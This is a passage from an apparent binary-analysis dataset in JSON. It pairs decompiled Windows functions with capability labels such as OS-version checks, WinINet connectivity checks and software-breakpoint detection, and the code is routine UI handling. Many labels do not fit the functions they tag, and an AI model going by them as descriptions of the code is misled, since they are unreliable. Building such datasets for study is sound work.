        "decompiled_code": "\nbool __cdecl fcn.00452e32(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_ECX;\n    bool bVar3;\n    uint var_14h;\n    \n    fcn.00452d04();\n    if (*in_ECX == NULL) {\n        bVar3 = false;\n    }\n    else {\n        uVar1 = fcn.00412d0c(arg_10h, arg_8h, &var_14h);\n        iVar2 = (**(**in_ECX + 0xc))(*in_ECX, uVar1, arg_ch);\n        bVar3 = -1 < iVar2;\n    }\n    return bVar3;\n}\n",
        "token_count": 170
    },
    "004531e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004531e7(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    pcVar1 = _sym.imp.USER32.dll_LoadCursorA;\n    piStack8 = param_1;\n    piStack4 = param_1;\n    if ((*0x4bb61c == 0) && (*0x4bb61c = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f8b),  *0x4bb61c == 0)) {\n        iVar2 = fcn.0043026e();\n        *0x4bb61c = (*pcVar1)(*(iVar2 + 0xc), 0x7901);\n        if (*0x4bb61c == 0) {\n            return;\n        }\n    }\n    (**(*param_1 + 0xc))(0xe145, 0, 0, &piStack8);\n    return;\n}\n",
        "token_count": 233
    },
    "00453350": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00453350(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint var_28h;\n    uint lpPoint;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = arg_8h;\n    uVar6 = *(arg_8h + 4);\n    if ((uVar6 == 0x367) || ((uVar6 == 0x100 && (*(arg_8h + 8) == 0x1b)))) {\ncode_r0x0045353b:\n        (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, uVar6, uVar6, 1);\n        return 0;\n    }\n    if (((uVar6 < 0x200) || (0x209 < uVar6)) && ((uVar6 < 0xa0 || (0xa9 < uVar6)))) {\n        if ((uVar6 != 0x112) && ((uVar6 < 0x100 || (0x109 < uVar6)))) {\n            iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(arg_8h, 0, uVar6, uVar6, 1);\n            if (iVar3 == 0) {\n                return 1;\n            }\ncode_r0x00453462:\n            (*_sym.imp.USER32.dll_DispatchMessageA)(iVar2);\n            return 1;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n        pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            do {\n                iVar3 = (*pcVar1)(&var_28h, 0, 0x200, 0x209, 3);\n            } while (iVar3 != 0);\n        }\n        iVar3 = (*pcVar1)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 0);\n        if (iVar3 == 0) goto code_r0x00453517;\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4));\n        iVar3 = (**(*var_4h + 0x100))(iVar2);\n        if (iVar3 != 0) goto code_r0x00453517;\n        (*_sym.imp.USER32.dll_TranslateMessage)(iVar2);\n        uVar6 = *(iVar2 + 4);\n        if ((uVar6 != 0x112) && ((uVar6 < 0x104 || (0x107 < uVar6)))) goto code_r0x00453517;\n    }\n    else {\n        iVar3 = fcn.00453241(*(arg_8h + 0x14), *(arg_8h + 0x18), &arg_8h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n        if (arg_8h == 0) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 1);\n            goto code_r0x00453462;\n        }\n        if (*(iVar2 + 4) != 0x201) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 1);\n            return 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x84, 0, CONCAT22(*(iVar2 + 0x18), *(iVar2 + 0x14)));\n        if ((iVar4 != 5) && (iVar4 != 3)) {\n            if (iVar4 == 1) {\n                uVar5 = fcn.00453039(iVar3, *(iVar2 + 0x14), iVar3);\n            }\n            else {\n                uVar5 = fcn.004530a7(iVar4);\n            }\n            *arg_ch = uVar5;\n            uVar6 = *(iVar2 + 4);\n            goto code_r0x0045353b;\n        }\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar2, 0, 0xa1, 0xa1);\n    }\n    (*_sym.imp.USER32.dll_DispatchMessageA)(iVar2);\ncode_r0x00453517:\n    (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n    fcn.00453241(lpPoint, var_8h, 0);\n    return 1;\n}\n",
        "token_count": 1095
    },
    "004538e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004538e5(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    if (arg_8h != 0) goto code_r0x004538fd;\ncode_r0x004538f8:\n    do {\n        fcn.00411e42();\ncode_r0x004538fd:\n        if (((*(arg_8h + 0x88) != 0) && (iVar4 = *(arg_8h + 0x8c),  iVar4 != 0)) && (*(iVar4 + 0x94) != 0)) {\n            iVar1 = fcn.00437ccf();\n            if ((iVar1 == 1) && ((*(iVar4 + 0x80) & arg_14h & 0xf000) != 0)) {\n                uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar4 + 0x20));\n                piVar3 = fcn.004185c5(uVar2);\n                if (piVar3 != NULL) {\n                    fcn.0041c2a1(0, arg_ch, arg_10h, 0, 0, 0x15);\n                    (**(*piVar3 + 0x148))(1);\n                    goto code_r0x00453a05;\n                }\n                goto code_r0x004538f8;\n            }\n        }\n        uVar5 = arg_14h;\n        if (((*(arg_8h + 0x80) & 4) != 0) && (uVar5 = arg_14h | 4,  (arg_14h & 0x5000) != 0)) {\n            uVar5 = arg_14h & 0xffff2fff | 0x2004;\n        }\n        arg_14h = uVar5;\n        piVar3 = fcn.004536fd(arg_14h);\n        if (piVar3 != NULL) {\n            fcn.0041c2a1(0, arg_ch, arg_10h, 0, 0, 0x15);\n            if (piVar3[0xe] == 0) {\n                piVar3[0xe] = *(arg_8h + 0x20);\n            }\n            iVar4 = fcn.0041bccc(0xe81f);\n            if (iVar4 != 0) {\n                fcn.004384c9(arg_8h, 0);\n                (**(*piVar3 + 0x148))(1);\n                uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_8h + 0x20), 0xfffffff0);\n                if ((uVar5 & 0x10000000) != 0) {\n                    fcn.0041bf7a(8);\ncode_r0x00453a05:\n                    (*_sym.imp.USER32.dll_UpdateWindow)(piVar3[8]);\n                }\n                return;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 718
    },
    "00453a15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00453a15(uint lprcSrc2, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, int32_t **arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t lprcSrc1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppiVar2 = arg_1ch;\n    arg_18h = arg_18h & 0xf040;\n    if (arg_1ch != NULL) {\n        *arg_1ch = NULL;\n    }\n    arg_1ch = *(in_ECX + 0x88);\n    do {\n        do {\n            if (arg_1ch == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.00416670(&arg_1ch);\n            piVar1 = *ppiVar3;\n            iVar4 = (**(*piVar1 + 0x15c))();\n        } while ((((iVar4 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowVisible)(piVar1[8]),  iVar4 == 0)) ||\n                 ((piVar1[0x20] & arg_18h & 0xf000) == 0)) ||\n                ((piVar1[0x25] != 0 && ((piVar1[0x20] & arg_18h & 0x40) == 0))));\n        (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[8], &lprcSrc1);\n        if (var_8h == lprcSrc1) {\n            var_8h = var_8h + 1;\n        }\n        if (var_4h == var_ch) {\n            var_4h = var_4h + 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcSrc1, &lprcSrc1, &lprcSrc2);\n    } while (iVar4 == 0);\n    if (ppiVar2 != NULL) {\n        *ppiVar2 = piVar1;\n    }\n    return piVar1[0x20] & arg_18h;\n}\n",
        "token_count": 541
    },
    "00459538": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00459538(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00431cc2();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        fcn.004115a4(extraout_ECX[10]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411a01();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 224
    },
    "00453e7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00453e7c(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *unaff_EBX;\n    uint *puVar5;\n    uint unaff_retaddr;\n    \n    puVar2 = fcn.00453b31(param_2, param_3);\n    if (puVar2 == NULL) {\n        if ((*(param_1 + 0x20) == 0) || (*(param_1 + 0x28) == *(param_1 + 0x24))) {\n            iVar1 = (*(param_1 + 0x24) + *(param_1 + 0x2c)) * 0x24;\n            uVar3 = fcn.00411579(-(iVar1 >> 0x20 != 0) | iVar1);\n            *(param_1 + 0x24) = *(param_1 + 0x24) + *(param_1 + 0x2c);\n            if (*(param_1 + 0x20) != 0) {\n                fcn.0041314e(uVar3, (*(param_1 + 0x24) + *(param_1 + 0x2c)) * 0x24, *(param_1 + 0x20), \n                             *(param_1 + 0x28) * 0x24);\n                fcn.004115a4(*(param_1 + 0x20));\n            }\n            *(param_1 + 0x20) = uVar3;\n        }\n        puVar2 = *(param_1 + 0x28) * 0x24 + *(param_1 + 0x20);\n        *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    }\n    else {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(puVar2[1]);\n        (*_sym.imp.ole32.dll_ReleaseStgMedium)(puVar2 + 5);\n    }\n    puVar2[8] = unaff_retaddr;\n    puVar5 = puVar2;\n    for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *unaff_EBX;\n        unaff_EBX = unaff_EBX + 1;\n        puVar5 = puVar5 + 1;\n    }\n    return puVar2;\n}\n",
        "token_count": 568
    },
    "00454a8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00454a8c(uint arg_8h, code *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0043026e();\n    iVar1 = *(iVar1 + 4);\n    if (*(iVar1 + 0x58) != 0) {\n        var_ch = (**(**(iVar1 + 0x58) + 0x10))();\n        while (var_ch != 0) {\n            piVar2 = (**(**(iVar1 + 0x58) + 0x14))(&var_ch);\n            var_8h = (**(*piVar2 + 0x54))();\n            while (var_8h != 0) {\n                piVar3 = (**(*piVar2 + 0x58))(&var_8h);\n                iVar4 = fcn.0042f538(0x49b05c);\n                if (iVar4 != 0) {\n                    var_4h = (**(*piVar3 + 0xb4))();\n                    while (iVar4 = fcn.00450d9b(&var_4h),  iVar4 != 0) {\n                        if ((((*(iVar4 + 0x60) != 0) && (*(*(iVar4 + 0x60) + 0x24) != 0)) && (*(iVar4 + 0x58) != 0)) &&\n                           ((iVar4 = fcn.0041f790(),  iVar4 != 0 && (iVar4 = (*arg_ch)(arg_8h),  iVar4 == 0)))) {\n                            return 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 434
    },
    "00456347": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00456347(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *pv;\n    \n    pv = NULL;\n    iVar2 = fcn.0044caa3(&var_8h, &pv, &var_ch);\n    if ((iVar2 == 0) && (var_8h = fcn.00431b02(*(in_ECX + 0x24), 0x49fb08),  var_8h == NULL)) {\n        return 0;\n    }\n    piVar1 = arg_8h;\n    if (arg_8h == NULL) {\n        if (pv == NULL) {\n            (**(*var_8h + 8))(var_8h);\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n        }\n        else {\ncode_r0x00456421:\n            (**(*var_8h + 0x10))(var_8h, var_ch);\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\ncode_r0x00456433:\n            (**(*var_8h + 8))(var_8h);\n        }\n        uVar3 = 1;\n    }\n    else {\n        if (((pv == NULL) || (*pv != *arg_8h)) || (iVar2 = fcn.00460c0e(pv, arg_8h, *arg_8h),  iVar2 != 0)) {\n            var_14h = 0xffffffff;\n            var_1ch = piVar1;\n            var_10h = 0x20;\n            var_20h._0_2_ = 3;\n            var_18h = 1;\n            iVar2 = (**(*var_8h + 0xc))(var_8h, &var_20h, 0x20, &arg_8h);\n            if (iVar2 == 0) {\n                if (pv != NULL) goto code_r0x00456421;\n                goto code_r0x00456433;\n            }\n            (**(*var_8h + 8))(var_8h);\n            uVar3 = 0;\n        }\n        else {\n            (**(*var_8h + 8))(var_8h);\n            uVar3 = 1;\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n    }\n    return uVar3;\n}\n",
        "token_count": 620
    },
    "00456813": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456813(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint lprc;\n    uint var_8h;\n    uint *var_4h;\n    \n    if (in_ECX[0x16] == 0) {\n        in_ECX[0x16] = arg_ch;\n    }\n    iVar2 = fcn.0043095b(0x453e50);\n    if (iVar2 == 0) {\n        fcn.00411e42();\n    }\n    uVar1 = *(iVar2 + 4);\n    *(iVar2 + 4) = 0;\n    var_4h = NULL;\n    if (arg_ch != 0) {\n        (*_sym.imp.USER32.dll_SetRectEmpty)(&lprc);\n        (**(*in_ECX + 0x70))(&lprc);\n        iVar3 = (*_sym.imp.USER32.dll_IsRectEmpty)(&lprc);\n        if (iVar3 == 0) {\n            var_4h = &lprc;\n            *(iVar2 + 4) = arg_ch;\n        }\n    }\n    var_8h = (**(*in_ECX + 0xc0))();\n    if (arg_ch == 0) {\n        arg_ch = 0;\n    }\n    else {\n        arg_ch = *(arg_ch + 0x20);\n    }\n    iVar3 = (**(*in_ECX[9] + 0x2c))(in_ECX[9], arg_8h, arg_10h, var_8h, 0xffffffff, arg_ch, var_4h);\n    *(iVar2 + 4) = uVar1;\n    iVar2 = fcn.0044ce9b();\n    if (iVar2 == 0) {\n        in_ECX[0x16] = 0;\n    }\n    *(in_ECX + 0x11) = iVar3 < 0;\n    (**(*in_ECX + 200))(iVar3);\n    return;\n}\n",
        "token_count": 476
    },
    "00457893": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00457893(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x40);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 != NULL) {\n        fcn.00457857(unaff_EBP + -0x14, 1, *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        *(unaff_EBP + -0x10) = 0;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x48) = *(unaff_EBP + 0x10);\n        if (((*(unaff_EBP + 0x14) != 3) && (iVar1 = fcn.004576ad(arg_8h_00, 1),  iVar1 != 0)) &&\n           ((*(unaff_EBP + -0x10) & 2) != 0)) {\n            (**(*arg_8h_00 + 0xc))(*(unaff_EBP + -0x48), 0, 0, 0);\n        }\n        fcn.00402740();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 468
    },
    "00457cc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457cc5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00434dfd(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 303
    },
    "00457d71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457d71(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    arg_8h = *(iVar1 + 8);\n    while (arg_8h != 0) {\n        fcn.00457c7d(&arg_8h);\n        fcn.00457d1e();\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00457dae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457dae(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    arg_8h = *(iVar1 + 4);\n    while (arg_8h != 0) {\n        fcn.00457c64(&arg_8h);\n        fcn.00457d48();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0045801a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045801a(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    int32_t *unaff_EDI;\n    uint64_t uVar4;\n    int32_t *piVar5;\n    \n    piVar5 = param_1 + 4;\n    if (*piVar5 != 0) {\n        (**(*param_1 + 0x48))();\n        fcn.00431b26(piVar5);\n        unaff_EDI = piVar5;\n    }\n    puVar1 = param_1 + 5;\n    uVar2 = *puVar1;\n    uVar4 = uVar2;\n    piVar5 = *(uVar2 - 0x10);\n    if (*(uVar2 - 0xc) != 0) {\n        if (*(uVar2 - 4) < 0) {\n            if (*(uVar2 - 8) < 0) {\n                uVar4 = fcn.00401280(0x80070057);\n            }\n            *(uVar4 + -0xc) = uVar4 >> 0x20;\n            **puVar1 = uVar4 >> 0x20;\n        }\n        else {\n            fcn.00402740(unaff_EDI, unaff_ESI);\n            iVar3 = (**(*piVar5 + 0xc))();\n            *puVar1 = iVar3 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "004588b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004588b3(void)\n\n{\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMetaFileDC.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != NULL) {\n        uVar1 = fcn.0042e1a4();\n        uVar1 = (*_sym.imp.GDI32.dll_CloseMetaFile)(uVar1);\n        (*_sym.imp.GDI32.dll_DeleteMetaFile)(uVar1);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042e1eb();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 230
    },
    "004588f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004588f8(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t Y;\n    \n    if (*(in_ECX + 8) != 0) {\n        var_8h = in_ECX;\n        Y = in_ECX;\n        uVar1 = (*_sym.imp.GDI32.dll_GetTextAlign)(*(in_ECX + 8));\n        if ((uVar1 & 6) != 6) {\n            if ((uVar1 & 6) == 2) {\n                arg_8h = -arg_8h;\n            }\n            fcn.00458865(&var_8h);\n            (*_sym.imp.GDI32.dll_MoveToEx)(*(in_ECX + 8), var_8h + arg_8h, Y, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0045909b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: yBottom\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: lpPoint\n\nvoid __cdecl fcn.0045909b(uint arg_8h, uint lprcSrc, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t *piVar4;\n    uint var_5ch;\n    uint lpPoint;\n    uint yBottom;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x50);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.00458ffa();\n    piVar4 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    if (piVar4 == NULL) {\n        piVar4 = unaff_EBP + -0x5c;\n    }\n    piVar4[0xd] = 0;\n    if (*(unaff_EBP + 0xc) == 0) {\n        (*_sym.imp.USER32.dll_GetCursorPos)(unaff_EBP + -0x1c);\n        (*_sym.imp.USER32.dll_SetRect)\n                  (piVar4 + 9, *(unaff_EBP + -0x1c), *(unaff_EBP + -0x18), *(unaff_EBP + -0x1c), *(unaff_EBP + -0x18));\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(piVar4 + 9, *(unaff_EBP + 0xc));\n    }\n    iVar1 = fcn.0041fd95();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_IsRectEmpty)(piVar4 + 9);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_InflateRect)(piVar4 + 9, *0x4bb6a4, *0x4bb6a4);\n        }\n    }\n    else {\n        piVar4[0xd] = 1;\n    }\n    iVar1 = *piVar4;\n    uVar2 = fcn.004122c3();\n    iVar1 = (**(iVar1 + 0x58))(uVar2);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00431b42(0x4a0ff8);\n        uVar3 = fcn.00431b42(0x49f9e8);\n        *(unaff_EBP + -0x10) = 0;\n        (*_sym.imp.ole32.dll_DoDragDrop)(uVar2, uVar3, *(unaff_EBP + 8), unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411a01();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 736
    },
    "00459208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
